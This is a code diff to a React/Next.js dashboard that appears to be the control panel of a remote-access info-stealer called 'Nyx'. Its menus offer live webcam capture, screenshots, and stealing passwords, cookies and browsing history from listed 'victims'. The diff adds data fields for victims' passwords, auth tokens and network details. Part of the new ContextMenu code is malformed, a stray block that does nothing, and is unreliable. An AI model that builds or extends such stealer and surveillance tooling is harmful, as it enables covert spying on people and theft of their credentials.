@@ -4,11 +4,13 @@ import Image from 'next/image'
 import { Menu, X } from 'lucide-react'
 import logo from '@/assets/logo.png'
 import prtsc from '@/assets/screenshot.png'
-import webcam from '@/assets/webcam.png'
+import webcam from '@/assets/webcam.gif'
 import { HereBackgroundGradientAnimation } from "./ui/background-gradient-animation";
-import Data from '@/data/teste.json';
 import { useParams } from 'next/navigation'
 import Footer from './footer/footer'
+import Data from '@/data/teste.json';
+import {Modal} from '@/components/Modal/modal'
+
 
 interface User {
   id: number;
@@ -33,7 +35,33 @@ interface User {
   city: string;
   cep: string;
   isp: string;
+  networkDetails: {
+    macAddress: string;
+    subnetMask: string;
+    gateway: string;
+    dns: string[];
+  };
+  cookies: {
+    sessionId: string;
+    authToken: string;
+    preferences: {
+      theme: string;
+      language: string;
+    };
+    expiration: string;
+  };
+  downloads: {
+    fileName: string;
+    fileSize: string;
+    downloadDate: string;
+  }[];
+  passwords: {
+    website: string;
+    username: string;
+    password: string;
+  }[];
 }
+const users: User[] = Data;
 
 interface networkDetails {
   macAdress: string;
@@ -69,7 +97,10 @@ export default function Component() {
   const [isScreenshotModalOpen, setIsScreenshotModalOpen] = useState(false);
   const [webcamImage, setWebcamImage] = useState<string | null>(null);
   const [screenshotImage, setScreenshotImage] = useState<string | null>(null);
-  const users: User[] = Data;
+  const [openPassowrd, setIsOpenPassowrd] = useState(false);
+  const [openCookie ,setIsOpenCookie] = useState(false);
+  const [openDownloads, setIsOpenDownloads] = useState(false);
+
 
 
 
@@ -103,6 +134,9 @@ export default function Component() {
     setContextMenu({ visible: true, x: e.clientX, y: e.clientY, userId })
     setSubMenu({ visible: false, x: 0, y: 0 })
   }
+  const handleCloseModal = () => {
+    setIsModalOpen(false);
+}
 
   const handleSubMenuHover = (e: React.MouseEvent<HTMLDivElement>) => {
     const rect = e.currentTarget.getBoundingClientRect()
@@ -118,10 +152,7 @@ export default function Component() {
     setContextMenu({ visible: false, x: 0, y: 0, userId: null });
   }
 
-  const handleCloseModal = () => {
-    setIsModalOpen(false);
-  }
-
+ 
   const handleOpenWebcamModal = () => {
     setIsWebcamModalOpen(true);
     setContextMenu({ visible: false, x: 0, y: 0, userId: null });
@@ -153,112 +184,7 @@ export default function Component() {
     imageSrc: string | null;
   }
  
-  const Modal = () => {
-    const selectedUser = users.find(user => user.id === selectedUserId);
   
-    return (
-    <div className="fixed inset-0 bg-black bg-opacity-50 flex justify-center items-center z-50">
-    <div className="bg-zinc-800 p-6 rounded-md text-white w-10/12 max-w-4xl h-4/5 overflow-y-auto space-y-6">
-    <div className="absolute inset-0 flex items-center justify-center opacity-5 pointer-events-none">
-        <Image
-          src={logo}
-          alt="Nyx Logo"
-          width={700}
-          height={700}
-        />
-      </div>
-      {/* Botão de fechar */}
-      
-      <button onClick={handleCloseModal} className=" self-start text-red-700">
-        CLOSE
-      </button>
-      <h2 className="text-3xl font-bold text-center">Victim informations</h2>
-        <div className="grid grid-cols-2 gap-4">
-          <div className="bg-zinc-900 p-4 rounded-md">
-            <strong>Display Name:</strong>
-            <p className="mt-1 text-sm bg-zinc-700 p-2 rounded-md">{selectedUser?.name || 'N/A'}</p>
-          </div>
-          <div className="bg-zinc-900 p-4 rounded-md">
-            <strong>Hostname:</strong>
-            <p className="mt-1 text-sm bg-zinc-700 p-2 rounded-md">{selectedUser?.hostname || 'N/A'}</p>
-          </div>
-          <div className="bg-zinc-900 p-4 rounded-md">
-            <strong>Username:</strong>
-            <p className="mt-1 text-sm bg-zinc-700 p-2 rounded-md">{selectedUser?.username || 'N/A'}</p>
-          </div>
-        </div>
-  
-        <h2 className="text-3xl font-bold text-center mt-8">System Informations</h2>
-        <div className="grid grid-cols-2 gap-4">
-          <div className="bg-zinc-900 p-4 rounded-md">
-            <strong>System:</strong>
-            <p className="mt-1 text-sm bg-zinc-700 p-2 rounded-md">{selectedUser?.os || 'N/A'}</p>
-          </div>
-          <div className="bg-zinc-900 p-4 rounded-md">
-            <strong>Version:</strong>
-            <p className="mt-1 text-sm bg-zinc-700 p-2 rounded-md">{selectedUser?.version || 'N/A'}</p>
-          </div>
-          <div className="bg-zinc-900 p-4 rounded-md">
-            <strong>Architecture:</strong>
-            <p className="mt-1 text-sm bg-zinc-700 p-2 rounded-md">{selectedUser?.architecture || 'N/A'}</p>
-          </div>
-        </div>
-  
-        <h2 className="text-3xl font-bold text-center mt-8">About the System</h2>
-        <div className="grid grid-cols-2 gap-4">
-          <div className="bg-zinc-900 p-4 rounded-md">
-            <strong>CPU:</strong>
-            <p className="mt-1 text-sm bg-zinc-700 p-2 rounded-md">{selectedUser?.cpu || 'N/A'}</p>
-          </div>
-          <div className="bg-zinc-900 p-4 rounded-md">
-            <strong>GPU:</strong>
-            <p className="mt-1 text-sm bg-zinc-700 p-2 rounded-md">{selectedUser?.gpu || 'N/A'}</p>
-          </div>
-          <div className="bg-zinc-900 p-4 rounded-md">
-            <strong>RAM:</strong>
-            <p className="mt-1 text-sm bg-zinc-700 p-2 rounded-md">{selectedUser?.ram || 'N/A'}</p>
-          </div>
-          <div className="bg-zinc-900 p-4 rounded-md">
-            <strong>HWID:</strong>
-            <p className="mt-1 text-sm bg-zinc-700 p-2 rounded-md">{selectedUser?.hwid || 'N/A'}</p>
-          </div>
-        </div>
-  
-        <h2 className="text-3xl font-bold text-center mt-8">Internet Informations</h2>
-        <div className="grid grid-cols-2 gap-4">
-          <div className="bg-zinc-900 p-4 rounded-md">
-            <strong>IP:</strong>
-            <p className="mt-1 text-sm bg-zinc-700 p-2 rounded-md">{selectedUser?.ip || 'N/A'}</p>
-          </div>
-          <div className="bg-zinc-900 p-4 rounded-md">
-            <strong>MAC:</strong>
-            <p className="mt-1 text-sm bg-zinc-700 p-2 rounded-md">fc:f0:c3:0f:3c:f0</p>
-          </div>
-          <div className="bg-zinc-900 p-4 rounded-md">
-            <strong>Country:</strong>
-            <p className="mt-1 text-sm bg-zinc-700 p-2 rounded-md">{selectedUser?.country || 'N/A'}</p>
-          </div>
-          <div className="bg-zinc-900 p-4 rounded-md">
-            <strong>Region:</strong>
-            <p className="mt-1 text-sm bg-zinc-700 p-2 rounded-md">{selectedUser?.region || 'N/A'}</p>
-          </div>
-          <div className="bg-zinc-900 p-4 rounded-md">
-            <strong>City:</strong>
-            <p className="mt-1 text-sm bg-zinc-700 p-2 rounded-md">{selectedUser?.city || 'N/A'}</p>
-          </div>
-          <div className="bg-zinc-900 p-4 rounded-md">
-            <strong>CEP:</strong>
-            <p className="mt-1 text-sm bg-zinc-700 p-2 rounded-md">{selectedUser?.cep || 'N/A'}</p>
-          </div>
-          <div className="bg-zinc-900 p-4 rounded-md">
-            <strong>ISP:</strong>
-            <p className="mt-1 text-sm bg-zinc-700 p-2 rounded-md">{selectedUser?.isp || 'N/A'}</p>
-          </div>
-        </div>
-      </div>
-      </div>
-  );
-};
   
 
 const ImageModal: React.FC<ImageModalProps> = ({ isOpen, onClose, title, imageSrc }) => {
@@ -281,16 +207,29 @@ const ImageModal: React.FC<ImageModalProps> = ({ isOpen, onClose, title, imageSr
     </div>
   );
 };
-  
 
-  const ContextMenu = () => (
+
+
+  function ContextMenu() {
+    {setOpenPassowrd: {users.map((user)=>(
+    <div key={user.id}>
+      <h2>Passowrd:</h2>
+      <br />
+      <ul>
+        <li>
+          {user.name}
+        </li>
+      </ul>
+    </div>
+    ))}}
+    return(
     <div
       ref={contextMenuRef}
       className="absolute bg-zinc-800 border border-zinc-700 rounded shadow-lg py-1 z-50"
       style={{ top: `${contextMenu.y}px`, left: `${contextMenu.x}px` }}
     >
       <div className="px-4 py-2 hover:bg-zinc-700 cursor-pointer" onClick={handleOpenModal}><abbr title="Here you can take the victim information" >GET Victim Information</abbr></div>
-      <div className="px-4 py-2 hover:bg-zinc-700 cursor-pointer" onClick={handleOpenWebcamModal}><abbr title="Here you can take a picture from the victim" >GET Webcam pic</abbr></div>
+      <div className="px-4 py-2 hover:bg-zinc-700 cursor-pointer" onClick={handleOpenWebcamModal}><abbr title="Here you can take a picture from the victim" >GET Webcam Live</abbr></div>
       <div className="px-4 py-2 hover:bg-zinc-700 cursor-pointer" onClick={handleOpenScreenshotModal}><abbr title="Here you can take a print from the victim" >GET Screnn Shot</abbr></div>
       <div className="px-4 py-2 hover:bg-zinc-700 cursor-pointer relative" onMouseEnter={handleSubMenuHover}>
         Stealer Options ▶
@@ -301,7 +240,7 @@ const ImageModal: React.FC<ImageModalProps> = ({ isOpen, onClose, title, imageSr
             style={{ top: '0', left: '100%', minWidth: 250 }}
           >
             <div className="px-4 py-2 hover:bg-zinc-700 cursor-pointer">
-              <abbr className='no-underline' title='Here you can steal the user Passwords'><p>Steal Passwords</p></abbr>
+              <abbr className='no-underline' title='Here you can steal the user Passwords'><button onClick={()=> setIsOpenPassowrd(true)}> <p>Steal Passwords</p> </button></abbr>
             </div>
             <div className="px-4 py-2 hover:bg-zinc-700 cursor-pointer"><abbr  title='Here you can steal the victmin Cookies'>Steal Cookies</abbr></div>
             <div className="px-4 py-2 hover:bg-zinc-700 cursor-pointer"><abbr  title='Here you can steal the victmin History'>Steal History</abbr></div>
@@ -321,7 +260,8 @@ const ImageModal: React.FC<ImageModalProps> = ({ isOpen, onClose, title, imageSr
         
         </div>
     </div>
-  )
+    )
+}
   
   return (
     <HereBackgroundGradientAnimation>      
@@ -418,14 +358,18 @@ const ImageModal: React.FC<ImageModalProps> = ({ isOpen, onClose, title, imageSr
 
       <Footer/>
     </div>
-
+    
     {contextMenu.visible && <ContextMenu />}
-      {isModalOpen && <Modal />}
+      {isModalOpen && <Modal children={(
+        <button onClick={handleCloseModal} className="self-start text-red-700">
+        CLOSE
+      </button>)}
+      />}
       {isWebcamModalOpen && (
         <ImageModal
           isOpen={isWebcamModalOpen}
           onClose={handleCloseWebcamModal}
-          title="Webcam Image"
+          title="LIVE"
           imageSrc={webcamImage}
         />
       )}
